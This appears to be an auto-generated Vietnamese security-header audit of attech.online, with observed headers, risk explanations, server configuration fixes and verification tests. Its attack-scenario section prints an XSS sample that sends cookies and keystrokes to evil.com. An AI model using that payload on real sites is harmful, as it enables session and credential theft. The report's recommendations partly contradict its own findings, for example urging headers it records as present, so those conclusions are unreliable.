# 🔒 Phân tích kỹ thuật: "Security Headers Missing/Misconfigured"

**Ngày phân tích:** 14/11/2025 13:41:24
**Website:** https://attech.online
**Domain:** attech.online
**Phân loại:** 🔴 Issues Detected

---

## 🚀 Quick Test Commands (Copy & Paste)

### Test nhanh bằng curl (10 giây):

```bash
# Test tất cả headers
curl -I https://attech.online | grep -i "strict-transport\|content-security\|x-frame\|x-content\|referrer\|permissions"

# Hoặc xem tất cả headers
curl -I https://attech.online
```

### Test bằng online tools:

```bash
# 1. SecurityHeaders.com (Tốt nhất)
https://securityheaders.com/?q=https://attech.online

# 2. Mozilla Observatory
https://observatory.mozilla.org/analyze/attech.online

# 3. Scan lại bằng tool này
python3 scanSecurityHeaders.py https://attech.online
```

---

## 📚 1. Tham chiếu chuẩn kỹ thuật

- **OWASP Top 10 2021:** A05:2021 – Security Misconfiguration
- **OWASP Secure Headers Project**
- **Mozilla Web Security Guidelines**
- **CWE-16:** Configuration

### Security Headers là gì?

**Security Headers** là các HTTP response headers giúp tăng cường bảo mật web application bằng cách:

1. **Kích hoạt các tính năng bảo mật của browser**
2. **Ngăn chặn các loại tấn công phổ biến** (XSS, clickjacking, etc.)
3. **Giảm thiểu attack surface**
4. **Tuân thủ security best practices**

**Tại sao quan trọng:**
- Modern browsers hỗ trợ nhiều security features
- Chỉ cần thêm headers → kích hoạt protection
- Chi phí thấp, hiệu quả cao
- Là yêu cầu của nhiều compliance standards (PCI-DSS, ISO 27001)

---

## 🧪 2. Kết quả kiểm tra thực tế

### Response Headers hiện tại:

```http
HTTP/1.1 200
Server: nginx/1.29.3
Date: Fri, 14 Nov 2025 06:41:24 GMT
Content-Type: text/html
Transfer-Encoding: chunked
Connection: keep-alive
Last-Modified: Fri, 14 Nov 2025 02:15:53 GMT
Vary: Accept-Encoding
ETag: W/"691690d9-991"
Content-Encoding: gzip
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval'; img-src 'self' data: https: http:; connect-src 'self' https://api.attech.online ws: wss:; font-src 'self' data: https://fonts.gstatic.com https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net https://cdnjs.cloudflare.com; frame-src https://www.youtube.com https://maps.google.com; frame-ancestors 'none';
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, Authorization
Access-Control-Allow-Credentials: true
```

### Security Headers Analysis:

| Header | Status | Current Value | Recommended | Severity |
|--------|--------|---------------|-------------|----------|
| Strict-Transport-Security | ❌ THIẾU | N/A | `max-age=31536000; includeSubDomains; pre...` | 🔴 High |
| Content-Security-Policy | ✅ CÓ | `default-src 'self' 'unsafe-inline' 'unsa...` | `default-src 'self'; script-src 'self'; o...` | 🔴 High |
| X-Content-Type-Options | ✅ CÓ | `nosniff` | `nosniff` | ⚠️ Medium |
| X-Frame-Options | ✅ CÓ | `DENY` | `DENY` | 🔴 High |
| Referrer-Policy | ✅ CÓ | `strict-origin-when-cross-origin` | `strict-origin-when-cross-origin` | ⚠️ Medium |
| Permissions-Policy | ✅ CÓ | `camera=(), microphone=(), geolocation=()...` | `geolocation=(), microphone=(), camera=()` | ℹ️ Low |
| X-XSS-Protection | ✅ CÓ | `1; mode=block` | `1; mode=block` | ℹ️ Low |


### Chi tiết từng header:

#### ❌ Strict-Transport-Security

**Mô tả:** HSTS - Bắt buộc sử dụng HTTPS

**Trạng thái:** ❌ Thiếu

**Khuyến nghị:** `max-age=31536000; includeSubDomains; preload`


**Nginx:**
```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
```

**Apache:**
```apache
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
```
#### ✅ Content-Security-Policy

**Mô tả:** CSP - Ngăn chặn XSS và data injection

**Giá trị hiện tại:** `default-src 'self' 'unsafe-inline' 'unsafe-eval'; img-src 'self' data: https: http:; connect-src 'self' https://api.attech.online ws: wss:; font-src 'self' data: https://fonts.gstatic.com https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net https://cdnjs.cloudflare.com; frame-src https://www.youtube.com https://maps.google.com; frame-ancestors 'none';`

**Trạng thái:** ✅ Đã có


**Nginx:**
```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none';" always;
```

**Apache:**
```apache
Header always set Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none';"
```
#### ✅ X-Content-Type-Options

**Mô tả:** Ngăn chặn MIME type sniffing

**Giá trị hiện tại:** `nosniff`

**Trạng thái:** ✅ Đã có


**Nginx:**
```nginx
add_header X-Content-Type-Options "nosniff" always;
```

**Apache:**
```apache
Header always set X-Content-Type-Options "nosniff"
```
#### ✅ X-Frame-Options

**Mô tả:** Chống clickjacking

**Giá trị hiện tại:** `DENY`

**Trạng thái:** ✅ Đã có


**Nginx:**
```nginx
add_header X-Frame-Options "DENY" always;
```

**Apache:**
```apache
Header always set X-Frame-Options "DENY"
```
#### ✅ Referrer-Policy

**Mô tả:** Kiểm soát thông tin referrer

**Giá trị hiện tại:** `strict-origin-when-cross-origin`

**Trạng thái:** ✅ Đã có


**Nginx:**
```nginx
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
```

**Apache:**
```apache
Header always set Referrer-Policy "strict-origin-when-cross-origin"
```
#### ✅ Permissions-Policy

**Mô tả:** Kiểm soát browser features/APIs

**Giá trị hiện tại:** `camera=(), microphone=(), geolocation=(), payment=()`

**Trạng thái:** ✅ Đã có


**Nginx:**
```nginx
add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
```

**Apache:**
```apache
Header always set Permissions-Policy "geolocation=(), microphone=(), camera=()"
```
#### ✅ X-XSS-Protection

**Mô tả:** Legacy XSS protection (deprecated)

**Giá trị hiện tại:** `1; mode=block`

**Trạng thái:** ✅ Đã có


**Nginx:**
```nginx
add_header X-XSS-Protection "1; mode=block" always;
```

**Apache:**
```apache
Header always set X-XSS-Protection "1; mode=block"
```


---

## 📊 3. So sánh: Có headers vs Không có headers

### ❌ Trường hợp THIẾU security headers (nguy hiểm):

```http
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html
(Không có security headers)
```

**Rủi ro thực tế:**

1. **Thiếu HSTS:**
   - User có thể bị MITM attack khi truy cập qua HTTP
   - SSL stripping attacks thành công
   - Sensitive data có thể bị lộ

2. **Thiếu CSP:**
   - XSS attacks dễ dàng thực thi
   - Data injection không bị chặn
   - Third-party scripts có thể inject malicious code

3. **Thiếu X-Frame-Options:**
   - Dễ bị clickjacking
   - UI redressing attacks
   - Phishing thông qua iframe

4. **Thiếu X-Content-Type-Options:**
   - MIME type sniffing
   - Browser có thể execute malicious content
   - File upload vulnerabilities

### ✅ Trường hợp ĐẦY ĐỦ security headers (an toàn):

```http
HTTP/1.1 200 OK
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=(), camera=()
```

**Bảo vệ:**
- ✅ Bắt buộc HTTPS (HSTS)
- ✅ Chặn XSS và data injection (CSP)
- ✅ Chống clickjacking (X-Frame-Options)
- ✅ Ngăn MIME sniffing (X-Content-Type-Options)
- ✅ Kiểm soát referrer information
- ✅ Hạn chế browser APIs nguy hiểm

### ✅ Trường hợp AN TOÀN (website đang kiểm tra):

**Điểm bảo mật:** 80/100

**Headers đã có:**
- ✅ Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval'; 
- ✅ X-Content-Type-Options: nosniff
- ✅ X-Frame-Options: DENY
- ✅ Referrer-Policy: strict-origin-when-cross-origin
- ✅ Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=
- ✅ X-XSS-Protection: 1; mode=block

**Headers còn thiếu:**
- ❌ Thiếu Strict-Transport-Security (HSTS - Bắt buộc sử dụng HTTPS)



---

## 🎯 4. Kịch bản tấn công khi thiếu headers

### Kịch bản 1: XSS Attack (thiếu CSP)

```html
<!-- Attacker inject script vào comment/profile -->
<script>
  // Đánh cắp cookies
  fetch('https://evil.com/steal?c=' + document.cookie);

  // Keylogger
  document.addEventListener('keypress', e => {
    fetch('https://evil.com/log?key=' + e.key);
  });

  // Đổi nội dung trang
  document.body.innerHTML = '<h1>Hacked!</h1>';
</script>
```

**Với CSP → Script bị chặn:**
```http
Content-Security-Policy: default-src 'self'; script-src 'self'
→ Browser blocks inline scripts and eval()
```

### Kịch bản 2: SSL Stripping (thiếu HSTS)

```
1. User gõ: bank.com (không có https://)
2. Browser gửi request qua HTTP
3. Attacker MITM → Giữ connection HTTP
4. User nhập username/password qua HTTP
5. Credentials bị đánh cắp
```

**Với HSTS → Browser tự động upgrade:**
```http
Strict-Transport-Security: max-age=31536000
→ Browser luôn dùng HTTPS, không bao giờ HTTP
```

### Kịch bản 3: MIME Confusion (thiếu X-Content-Type-Options)

```javascript
// Attacker upload file: avatar.jpg
// Thực chất là: malicious.html với MIME type image/jpeg

// Browser sniff content → Phát hiện HTML → Execute script
// User visit /uploads/avatar.jpg → XSS

// Với X-Content-Type-Options: nosniff
// → Browser tuân thủ Content-Type, không execute
```

---

## 📋 5. Bảng đánh giá bảo vệ

| Tiêu chí | Kết quả | Đánh giá |
|----------|---------|----------|
| High Severity Headers | ❌ 2/3 | Còn thiếu |
| Medium Severity Headers | ✅ 2/2 | Đầy đủ |
| Low Severity Headers | ✅ 2/2 | Đầy đủ |

**Tổng điểm bảo mật:** 80/100

⚠️ **Đánh giá:** TỐT - Còn một số headers cần bổ sung


---

## 🔧 6. Biện pháp khắc phục

### Hướng dẫn thêm từng header:

#### Thêm Strict-Transport-Security


**Nginx:**
```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
```

**Apache:**
```apache
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
```


### Cấu hình tổng hợp (All-in-one):

**Nginx:**
```nginx
# /etc/nginx/sites-available/your-site
server {
    listen 443 ssl http2;
    server_name attech.online;

    # Security Headers
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self';" always;
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
    add_header X-XSS-Protection "1; mode=block" always;

    # Ẩn server version
    server_tokens off;

    ...
}
```

**Apache (.htaccess hoặc httpd.conf):**
```apache
<IfModule mod_headers.c>
    # HSTS
    Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"

    # CSP
    Header always set Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none';"

    # Other headers
    Header always set X-Frame-Options "DENY"
    Header always set X-Content-Type-Options "nosniff"
    Header always set Referrer-Policy "strict-origin-when-cross-origin"
    Header always set Permissions-Policy "geolocation=(), microphone=(), camera=()"
    Header always set X-XSS-Protection "1; mode=block"
</IfModule>

# Ẩn server version
ServerTokens Prod
ServerSignature Off
```

**Node.js (Express + Helmet):**
```javascript
const express = require('express');
const helmet = require('helmet');

const app = express();

// Helmet tự động thêm security headers
app.use(helmet({
  strictTransportSecurity: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  },
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'"],
      fontSrc: ["'self'", "data:"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],
    },
  },
  frameguard: { action: 'deny' },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  permissionsPolicy: {
    features: {
      geolocation: [],
      microphone: [],
      camera: []
    }
  }
}));

app.listen(3000);
```

**Next.js (next.config.js):**
```javascript
module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'Strict-Transport-Security',
            value: 'max-age=31536000; includeSubDomains; preload'
          },
          {
            key: 'Content-Security-Policy',
            value: "default-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline'; style-src 'self' 'unsafe-inline';"
          },
          {
            key: 'X-Frame-Options',
            value: 'DENY'
          },
          {
            key: 'X-Content-Type-Options',
            value: 'nosniff'
          },
          {
            key: 'Referrer-Policy',
            value: 'strict-origin-when-cross-origin'
          },
          {
            key: 'Permissions-Policy',
            value: 'geolocation=(), microphone=(), camera=()'
          }
        ],
      },
    ]
  },
}
```

**Vercel (vercel.json):**
```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        {
          "key": "Strict-Transport-Security",
          "value": "max-age=31536000; includeSubDomains; preload"
        },
        {
          "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self'; object-src 'none';"
        },
        {
          "key": "X-Frame-Options",
          "value": "DENY"
        },
        {
          "key": "X-Content-Type-Options",
          "value": "nosniff"
        },
        {
          "key": "Referrer-Policy",
          "value": "strict-origin-when-cross-origin"
        },
        {
          "key": "Permissions-Policy",
          "value": "geolocation=(), microphone=(), camera=()"
        }
      ]
    }
  ]
}
```

**Cloudflare Workers:**
```javascript
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const response = await fetch(request)
  const newHeaders = new Headers(response.headers)

  // Add security headers
  newHeaders.set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload')
  newHeaders.set('Content-Security-Policy', "default-src 'self'; script-src 'self';")
  newHeaders.set('X-Frame-Options', 'DENY')
  newHeaders.set('X-Content-Type-Options', 'nosniff')
  newHeaders.set('Referrer-Policy', 'strict-origin-when-cross-origin')
  newHeaders.set('Permissions-Policy', 'geolocation=(), microphone=(), camera=()')

  return new Response(response.body, {
    status: response.status,
    headers: newHeaders
  })
}
```

**⚠️ Lưu ý quan trọng:**

1. **CSP có thể break website:**
   - Test kỹ trong staging environment
   - Bắt đầu với report-only mode:
     ```
     Content-Security-Policy-Report-Only: ...
     ```
   - Sau khi verify không có vấn đề → chuyển sang enforce mode

2. **HSTS preload:**
   - Chỉ submit vào preload list khi chắc chắn
   - Rất khó để revert
   - Đảm bảo tất cả subdomains đều support HTTPS

3. **Testing:**
   - Test trên nhiều browsers (Chrome, Firefox, Safari, Edge)
   - Check DevTools Console cho errors
   - Verify functionality không bị ảnh hưởng

---

## ✅ 7. Kiểm tra lại sau khi khắc phục

### Bước 1: Kiểm tra bằng curl

```bash
# Kiểm tra từng header
curl -I https://attech.online | grep -i "strict-transport\|content-security\|x-frame\|x-content\|referrer\|permissions"

# Hoặc xem tất cả headers
curl -I https://attech.online
```

### Bước 2: Test bằng Browser DevTools

```javascript
// Chrome/Firefox DevTools Console
fetch(window.location.href)
  .then(r => {
    console.log('Strict-Transport-Security:', r.headers.get('strict-transport-security'));
    console.log('Content-Security-Policy:', r.headers.get('content-security-policy'));
    console.log('X-Frame-Options:', r.headers.get('x-frame-options'));
    console.log('X-Content-Type-Options:', r.headers.get('x-content-type-options'));
    console.log('Referrer-Policy:', r.headers.get('referrer-policy'));
    console.log('Permissions-Policy:', r.headers.get('permissions-policy'));
  });
```

### Bước 3: Online Security Scanners

```bash
# 1. SecurityHeaders.com (Tốt nhất - cho điểm A-F)
https://securityheaders.com/?q=https://attech.online

# 2. Mozilla Observatory
https://observatory.mozilla.org/analyze/attech.online

# 3. SSL Labs (cho HSTS)
https://www.ssllabs.com/ssltest/analyze.html?d=attech.online

# 4. Scan lại bằng tool này
python3 scanSecurityHeaders.py https://attech.online
```

### Bước 4: CSP Validator

```bash
# Validate CSP syntax
https://csp-evaluator.withgoogle.com/

# Paste CSP policy để check syntax và security issues
```

### Bước 5: Automated Testing

```javascript
// Playwright/Puppeteer test
const { test, expect } = require('@playwright/test');

test('All security headers present', async ({ page }) => {
  const response = await page.goto('https://attech.online');

  const headers = response.headers();

  expect(headers['strict-transport-security']).toBeTruthy();
  expect(headers['content-security-policy']).toBeTruthy();
  expect(headers['x-frame-options']).toBeTruthy();
  expect(headers['x-content-type-options']).toBe('nosniff');
  expect(headers['referrer-policy']).toBeTruthy();
});
```

---

## 📊 8. Kết luận và khuyến nghị

### Đánh giá tổng quan:

🔴 **Website CẦN CẢI THIỆN SECURITY HEADERS**

**Điểm bảo mật:** 80/100
**Mức độ rủi ro:** Medium
**CVSS Score:** 4.3

**Headers còn thiếu:**
- ❌ Thiếu Strict-Transport-Security (HSTS - Bắt buộc sử dụng HTTPS)

**Tác động:**
- Giảm khả năng chống các tấn công phổ biến
- Không tận dụng được security features của browser
- Vi phạm security best practices
- Có thể fail security audit/compliance

**Hành động khuyến nghị:**
1. 🔴 **PRIORITY HIGH** - Thêm HSTS và CSP ngay lập tức
2. ⚠️ **PRIORITY MEDIUM** - Thêm X-Frame-Options và X-Content-Type-Options
3. ℹ️ **PRIORITY LOW** - Bổ sung các headers còn lại
4. 🧪 **TEST** - Verify không ảnh hưởng functionality
5. 📊 **MONITOR** - Regular scan để maintain security posture


---

## 🔗 References

- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)
- [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [HSTS Preload List](https://hstspreload.org/)
- [SecurityHeaders.com](https://securityheaders.com/)

---

**Prepared by:** Security Headers Scanner
**Scan Time:** 2025-11-14 13:41:24
**Report Version:** 1.0
**Tool Version:** 1.0.0
